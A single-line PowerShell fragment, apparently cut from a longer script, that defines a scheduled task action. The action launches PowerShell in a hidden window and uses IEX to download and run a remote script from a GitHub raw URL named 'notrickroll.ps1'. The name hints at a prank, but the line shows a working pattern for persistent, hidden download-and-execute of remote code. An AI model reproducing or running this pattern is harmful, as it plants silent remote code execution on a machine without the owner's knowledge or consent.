...
$action = New-ScheduledTaskAction -Execute 'powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('https://github.com/CHONK12/rickRoll/raw/main/notrickroll.ps1');"' 
